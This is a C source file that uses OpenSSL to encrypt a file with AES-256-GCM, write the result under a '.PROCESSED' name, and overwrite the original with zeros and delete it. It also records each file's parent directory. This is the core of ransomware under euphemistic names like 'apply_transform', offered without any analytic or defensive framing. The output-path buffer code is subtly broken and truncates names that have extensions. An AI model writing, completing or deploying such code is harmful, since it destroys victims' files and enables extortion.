#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <errno.h>
#include <limits.h>
#include <pthread.h>
#include <libgen.h>
#include <unistd.h>
#include <openssl/evp.h>
#include <openssl/rand.h>

/* Thread-safe directory recording structure */
static pthread_mutex_t dir_mutex = PTHREAD_MUTEX_INITIALIZER;
static char **recorded_dirs = NULL;
static size_t recorded_count = 0;
static size_t recorded_capacity = 0;

/* Helper: append a directory path to the static list */
static int record_directory(const char *dir_path) {
    char *copy = strdup(dir_path);
    if (!copy) {
        perror("strdup");
        return -1;
    }
    pthread_mutex_lock(&dir_mutex);
    if (recorded_count >= recorded_capacity) {
        size_t new_cap = recorded_capacity ? recorded_capacity * 2 : 4;
        char **new_dirs = realloc(recorded_dirs, new_cap * sizeof(char *));
        if (!new_dirs) {
            pthread_mutex_unlock(&dir_mutex);
            free(copy);
            perror("realloc");
            return -1;
        }
        recorded_dirs = new_dirs;
        recorded_capacity = new_cap;
    }
    recorded_dirs[recorded_count++] = copy;
    pthread_mutex_unlock(&dir_mutex);
    return 0;
}

/* Helper: write exactly 'len' bytes from 'buf' to 'fp' */
static int write_all(FILE *fp, const void *buf, size_t len) {
    size_t written = 0;
    while (written < len) {
        size_t ret = fwrite((const char *)buf + written, 1, len - written, fp);
        if (ret == 0) {
            if (ferror(fp)) {
                perror("fwrite");
                return -1;
            }
            /* shouldn't happen, but break */
            break;
        }
        written += ret;
    }
    return (written == len) ? 0 : -1;
}

/* Read a file into a dynamically allocated buffer; returns length on success, -1 on error */
static long read_file_bytes(FILE *fp, uint8_t **out_buf) {
    if (fseek(fp, 0, SEEK_END) != 0) {
        perror("fseek");
        return -1;
    }
    long len = ftell(fp);
    if (len < 0) {
        perror("ftell");
        return -1;
    }
    rewind(fp);

    *out_buf = malloc(len);
    if (!*out_buf) {
        perror("malloc");
        return -1;
    }
    size_t nread = fread(*out_buf, 1, len, fp);
    if (nread != (size_t)len) {
        if (ferror(fp)) perror("fread");
        free(*out_buf);
        *out_buf = NULL;
        return -1;
    }
    return len;
}

int apply_transform(const char *file_path, const uint8_t key[32]) {
    FILE *orig_fp = NULL, *out_fp = NULL;
    uint8_t *orig_data = NULL;
    long orig_len = 0;
    uint8_t nonce[12];
    EVP_CIPHER_CTX *ctx = NULL;
    uint8_t *ciphertext = NULL;
    int ciphertext_len = 0;
    uint8_t tag[16];
    char *processed_path = NULL;
    int ret = -1;

    /* 1. Open original file for reading */
    orig_fp = fopen(file_path, "rb");
    if (!orig_fp) {
        fprintf(stderr, "Error: cannot open '%s' for reading: %s\n", file_path, strerror(errno));
        goto cleanup;
    }

    /* Read original file completely */
    orig_len = read_file_bytes(orig_fp, &orig_data);
    if (orig_len < 0) {
        goto cleanup;
    }
    fclose(orig_fp);
    orig_fp = NULL;

    /* 2. Generate 12-byte nonce */
    if (RAND_bytes(nonce, sizeof(nonce)) != 1) {
        fprintf(stderr, "RAND_bytes failed\n");
        goto cleanup;
    }

    /* 3. Set up encryption context */
    ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        fprintf(stderr, "EVP_CIPHER_CTX_new failed\n");
        goto cleanup;
    }
    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL) != 1) {
        fprintf(stderr, "EVP_EncryptInit_ex (cipher) failed\n");
        goto cleanup;
    }
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, sizeof(nonce), NULL) != 1) {
        fprintf(stderr, "EVP_CTRL_GCM_SET_IVLEN failed\n");
        goto cleanup;
    }
    if (EVP_EncryptInit_ex(ctx, NULL, NULL, key, nonce) != 1) {
        fprintf(stderr, "EVP_EncryptInit_ex (key+iv) failed\n");
        goto cleanup;
    }

    /* Allocate ciphertext buffer: plaintext length + block size - 1 */
    ciphertext = malloc(orig_len + EVP_MAX_BLOCK_LENGTH);
    if (!ciphertext) {
        perror("malloc");
        goto cleanup;
    }
    int outlen = 0;
    if (EVP_EncryptUpdate(ctx, ciphertext, &outlen, orig_data, (int)orig_len) != 1) {
        fprintf(stderr, "EVP_EncryptUpdate failed\n");
        goto cleanup;
    }
    ciphertext_len = outlen;
    if (EVP_EncryptFinal_ex(ctx, ciphertext + ciphertext_len, &outlen) != 1) {
        fprintf(stderr, "EVP_EncryptFinal_ex failed\n");
        goto cleanup;
    }
    ciphertext_len += outlen;

    /* Get GCM tag */
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, sizeof(tag), tag) != 1) {
        fprintf(stderr, "EVP_CTRL_GCM_GET_TAG failed\n");
        goto cleanup;
    }

    /* 4. Build output path: preserve extension, add .PROCESSED */
    {
        const char *dot = strrchr(file_path, '.');
        size_t base_len = dot ? (size_t)(dot - file_path) : strlen(file_path);
        processed_path = malloc(base_len + 11 + 1); /* .PROCESSED = 10 + 1 for dot? Actually .PROCESSED is 10 chars, plus null */
        if (!processed_path) {
            perror("malloc");
            goto cleanup;
        }
        if (dot) {
            snprintf(processed_path, base_len + 11 + 1, "%.*s%s.PROCESSED",
                     (int)base_len, file_path, dot);
        } else {
            snprintf(processed_path, strlen(file_path) + 11 + 1, "%s.PROCESSED", file_path);
        }
    }

    /* 5. Write processed file: nonce + ciphertext + tag */
    out_fp = fopen(processed_path, "wb");
    if (!out_fp) {
        fprintf(stderr, "Error: cannot create '%s': %s\n", processed_path, strerror(errno));
        goto cleanup;
    }
    if (write_all(out_fp, nonce, sizeof(nonce)) != 0) goto cleanup;
    if (write_all(out_fp, ciphertext, ciphertext_len) != 0) goto cleanup;
    if (write_all(out_fp, tag, sizeof(tag)) != 0) goto cleanup;
    fclose(out_fp);
    out_fp = NULL;

    /* 6. Overwrite original file with zeros and delete */
    {
        FILE *zero_fp = fopen(file_path, "wb");
        if (!zero_fp) {
            fprintf(stderr, "Error: cannot open '%s' for overwrite: %s\n", file_path, strerror(errno));
            goto cleanup;
        }
        /* Write zeros in chunks to avoid huge allocation */
        uint8_t zero_buf[4096] = {0};
        long remaining = orig_len;
        while (remaining > 0) {
            size_t to_write = (remaining > (long)sizeof(zero_buf)) ? sizeof(zero_buf) : (size_t)remaining;
            if (write_all(zero_fp, zero_buf, to_write) != 0) {
                fclose(zero_fp);
                goto cleanup;
            }
            remaining -= (long)to_write;
        }
        fclose(zero_fp);
        if (remove(file_path) != 0) {
            fprintf(stderr, "Error: cannot remove '%s': %s\n", file_path, strerror(errno));
            goto cleanup;
        }
    }

    /* 7. Record parent directory */
    {
        char *dir_copy = strdup(file_path);
        if (!dir_copy) {
            perror("strdup");
            goto cleanup;
        }
        char *dir = dirname(dir_copy); /* dirname may modify string; we have a copy */
        if (record_directory(dir) != 0) {
            free(dir_copy);
            goto cleanup;
        }
        free(dir_copy);
    }

    ret = 0;  /* success */

cleanup:
    if (orig_fp) fclose(orig_fp);
    if (out_fp) fclose(out_fp);
    free(orig_data);
    free(ciphertext);
    free(processed_path);
    if (ctx) EVP_CIPHER_CTX_free(ctx);
    return ret;
}